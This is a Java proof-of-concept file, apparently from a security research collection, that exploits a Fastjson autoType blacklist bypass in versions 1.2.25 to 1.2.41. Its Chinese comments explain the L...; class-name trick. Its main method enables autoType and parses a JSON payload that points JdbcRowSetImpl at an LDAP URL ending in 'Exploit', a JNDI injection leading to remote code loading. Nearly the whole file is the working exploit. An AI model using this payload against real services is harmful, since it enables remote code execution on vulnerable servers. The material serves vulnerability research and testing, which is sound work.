package com.jemmy.serialize.leak;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * 1.2.24之前没有autotype的限制，从1.2.25开始默认关闭了autotype支持，
 * 并且加入了checkAutotype，加入了黑名单+白名单来防御autotype开启的情况。
 * 在1.2.25到1.2.41之间，发生了一次checkAutotype的绕过。
 *
 * FastJson ver >=1.2.25 & ver <= 1.2.41
 * 开启autoType
 *
 * <code>@type</code>指定的类前后加上L和;来绕过黑名单检测
 *
 * @author zhujiang.cheng
 * @since 2020/6/3
 */
public class JdbcRowSetLAttack {

    public static void main(String[] args) {
        String payload = "{\"rand1\":{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\",\"autoCommit\":true}}";
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        JSONObject jsonObject = JSON.parseObject(payload);
        System.out.println(jsonObject);
    }
}
